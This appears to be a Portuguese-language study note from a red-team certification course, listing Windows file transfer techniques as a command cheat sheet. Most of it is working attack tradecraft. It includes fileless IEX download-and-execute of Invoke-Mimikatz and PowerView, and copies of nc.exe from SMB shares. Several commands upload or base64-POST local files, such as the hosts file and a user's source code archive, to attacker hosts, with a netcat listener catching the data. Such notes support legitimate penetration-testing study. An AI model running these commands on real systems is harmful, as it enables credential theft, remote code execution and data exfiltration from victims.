> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/file-transfers/windows-file-transfer-methods.md).

# Windows File Transfer Methods

### **Powershell**

* **Download de um arquivo**

```powershell
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

* **PowerShell DownloadString - Método sem arquivo**

Em vez de baixar um script do PowerShell para o disco, podemos executá-lo diretamente na memória usando o cmdlet [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) ou o alias `IEX`

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

* **PowerShell Invoke-WebRequest**

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

* Ignorar erros comuns de download no `IE`

```sh
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

* Outro erro nos downloads do PowerShell está relacionado ao canal seguro SSL/TLS se o certificado não for confiável. Podemos ignorar esse erro com o seguinte comando:

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

#### **SMB Downloads**

* **Create the SMB Server**

```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

* **Copy a File from the SMB Server**

```powershell
copy \\192.168.220.133\share\nc.exe
```

* **Crie o servidor SMB com um nome de usuário e senha**

```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

* **Monte o servidor SMB com nome de usuário e senha**

{% code lineNumbers="true" %}

```powershell
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

{% endcode %}

#### FTP Downloads

* **Instalando o módulo Python3 do servidor FTP - pyftpdlib**

```sh
sudo pip3 install pyftpdlib
```

* **Configurando um servidor FTP Python3**

```sh
sudo python3 -m pyftpdlib --port 21
```

* **Transferindo arquivos de um servidor FTP usando o PowerShell**

```sh
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

{% hint style="info" %}
O Kali Linux bloqueia instalação global por segurança, exemplo: `pip`
{% endhint %}

* **Para reverter isso podemos usar os seguintes comandos:**

{% tabs %}
{% tab title="Usar ambiente virtual " %}
{% code lineNumbers="true" %}

```bash
python3 -m venv venv
source venv/bin/activate #deactivate, para sair
pip install uploadserver
```

{% endcode %}
{% endtab %}

{% tab title="Usar pipx (melhor para ferramentas)" %}
{% code lineNumbers="true" %}

```bash
sudo apt install pipx
pipx install uploadserver

#O pipx cria um ambiente isolado automaticamente.
```

{% endcode %}
{% endtab %}
{% endtabs %}

#### PowerShell Web Uploads

* **Instalando um WebServer**

```sh
pip3 install uploadserver
```

* **Configurando o Upload**

```sh
python3 -m uploadserver
```

* **Script do PowerShell para carregar um arquivo no servidor de upload do Python**

```sh
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

* Carregamento da Web do PowerShell Base64

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

* Capturamos os dados base64 com o Netcat e usamos o aplicativo base64 com a opção decode para converter a string no arquivo.

```
nc -lvnp 8000
echo <base64> | base64 -d -w 0 > hosts
```

***

#### SMB Uploads

* **Instalando módulos Python do WebDav**

```sh
sudo pip3 install wsgidav cheroot
```

* **Usando o módulo Python WebDav**

```sh
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

* **Conectando-se ao Webdav Share**

```powershell
dir \\192.168.49.128\DavWWWRoot
```

* **Carregando arquivos usando SMB**

```powershell
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

#### FTP Uploads

```sh
sudo python3 -m pyftpdlib --port 21 --write
```

* **Arquivo de upload do PowerShell**

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
